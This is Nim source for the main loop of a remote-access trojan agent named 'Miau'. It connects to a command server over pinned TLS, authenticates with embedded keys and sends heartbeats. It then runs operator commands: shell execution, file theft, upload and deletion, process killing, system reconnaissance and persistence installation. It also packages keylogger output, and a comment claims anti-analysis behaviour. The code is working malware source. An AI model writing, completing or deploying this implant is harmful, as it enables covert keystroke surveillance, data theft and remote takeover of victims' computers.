## Miau agent main loop: connect -> TLS pin -> auth -> heartbeat -> commands.
import std/strutils, std/os, std/times, std/net, std/osproc
import nativesockets
import miau_codec, miau_config, transport, commands, persistence

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

proc nowTs(): uint64 =
  uint64(getTime().toUnix())

proc buildAuth(): Envelope =
  ## ClientAuth envelope.
  let authPayload = encodeClientAuth((
    token: AgentToken,
    hostname: getHostname(),
    username: getEnv("USERNAME", ""),
    os: hostOS,
    arch: hostCPU,
    clientVer: ClientVersion,
    installId: getEnv("COMPUTERNAME", getHostname()),
  ))
  Envelope(
    version: 1'u32,
    token: AgentToken,
    seq: 0'u64,
    timestamp: nowTs(),
    packetType: PACKET_AUTH,
    payload: authPayload,
    hasVersion: true, hasToken: true, hasSeq: true, hasTimestamp: true,
    hasPacketType: true, hasPayload: true,
  )

proc buildHeartbeat(): Envelope =
  let hb = encodeHeartbeat((
    cpu: 0'u32, ramUsed: 0'u32, ramTotal: 0'u32,
    pubIp: "", privIp: "", uptime: nowTs(),
  ))
  Envelope(
    version: 1'u32,
    token: AgentToken,
    seq: 0'u64,
    timestamp: nowTs(),
    packetType: PACKET_HEARTBEAT,
    payload: hb,
    hasVersion: true, hasToken: true, hasTimestamp: true,
    hasPacketType: true, hasPayload: true,
  )

proc buildResponse(cmdId: uint64, status: int, msg, data: string, final: bool = true): Envelope =
  let resp = encodeResponse((
    id: cmdId, status: status, message: msg, data: data, final: final,
  ))
  Envelope(
    version: 1'u32,
    token: AgentToken,
    timestamp: nowTs(),
    packetType: PACKET_RESPONSE,
    payload: resp,
    hasVersion: true, hasToken: true, hasTimestamp: true,
    hasPacketType: true, hasPayload: true,
  )

proc buildKeylog(window, text: string, ts: int64): Envelope =
  let kl = encodeKeyLog((window: window, text: text, ts: ts))
  Envelope(
    version: 1'u32,
    token: AgentToken,
    timestamp: nowTs(),
    packetType: PACKET_KEYLOG,
    payload: kl,
    hasVersion: true, hasToken: true, hasTimestamp: true,
    hasPacketType: true, hasPayload: true,
  )

# ---------------------------------------------------------------------------
# command dispatch
# ---------------------------------------------------------------------------

proc handleCommand(t: Transport, cmd: Command) =
  var res: ExecResult
  case cmd.cmdType
  of CMD_SHELL_EXEC:
    res = runShell(cmd.args, 30000)
  of CMD_FILE_LIST:
    res = fileList(cmd.args)
  of CMD_FILE_DOWNLOAD:
    res = fileRead(cmd.args)
  of CMD_FILE_UPLOAD:
    # args = target path, blob = base64 data (args split: path|b64)
    let parts = cmd.args.split("|", maxSplit = 1)
    if parts.len == 2:
      res = fileWrite(parts[0], parts[1])
    else:
      res = ExecResult(status: RESP_ERROR, message: "bad upload args", data: "", final: true)
  of CMD_FILE_DELETE:
    res = fileDelete(cmd.args)
  of CMD_PROCESS_LIST:
    res = processList()
  of CMD_PROCESS_KILL:
    res = processKill(cmd.args)
  of CMD_NET_LIST:
    res = netList()
  of CMD_SYSINFO:
    res = sysInfo()
  of CMD_PERSIST_INSTALL:
    res = installAll()
  of CMD_PERSIST_REMOVE:
    res = removeAll()
  of CMD_PING:
    res = ExecResult(status: RESP_OK, message: "pong", data: "", final: true)
  else:
    res = ExecResult(status: RESP_ERROR,
                     message: "unhandled cmd type " & $cmd.cmdType,
                     data: "", final: true)
  t.sendEnvelope(buildResponse(cmd.id, res.status, res.message, res.data, res.final))

# ---------------------------------------------------------------------------
# main session
# ---------------------------------------------------------------------------

proc runSession() =
  var t = Transport()
  try:
    t.connect(ServerAddr, Port(ServerPort), CaPath, ServerPin)
  except CatchableError as exc:
    stderr.writeLine("[miau] connect failed: " & exc.msg)
    return

  # AUTH
  try:
    # auth handshake frame uses the server PSK; everything after uses AES key
    t.setKey(PskHex)
    t.sendEnvelope(buildAuth())
    t.setKey(AgentAesKey)
    let ackEnv = t.readEnvelope()
    if ackEnv.packetType == PACKET_AUTH_ACK:
      let ack = decodeAuthAck(ackEnv.payload)
      if ack.hasAccepted and not ack.accepted:
        stderr.writeLine("[miau] auth rejected: " & ack.reason)
        t.close()
        return
  except CatchableError as exc:
    stderr.writeLine("[miau] auth failed: " & exc.msg)
    t.close()
    return

  var lastHb = epochTime()

  # COMMAND LOOP (non-blocking reads; heartbeat on a timer)
  while true:
    # heartbeat on timer (keeps server happy and triggers command flush)
    if epochTime() - lastHb >= float(HbInterval):
      try:
        t.sendEnvelope(buildHeartbeat())
        lastHb = epochTime()
      except CatchableError:
        break

    if not t.waitReadable(1000):
      continue

    var env: Envelope
    try:
      env = t.readEnvelope()
    except CatchableError:
      break  # connection lost / closed -> reconnect

    case env.packetType
    of PACKET_COMMAND:
      if env.hasPayload:
        let cmd = decodeCommand(env.payload)
        try:
          handleCommand(t, cmd)
        except CatchableError as exc:
          t.sendEnvelope(buildResponse(cmd.id, RESP_ERROR, exc.msg, "", true))
    of PACKET_AUTH_ACK:
      discard
    else:
      discard

  t.close()

# ---------------------------------------------------------------------------
# entry point
# ---------------------------------------------------------------------------

when isMainModule:
  # basic anti-analysis: ignore most command-line args
  discard
  while true:
    runSession()
    # if connect failed quickly, backoff to avoid hot reconnect loop
    sleep(HbInterval * 1000)
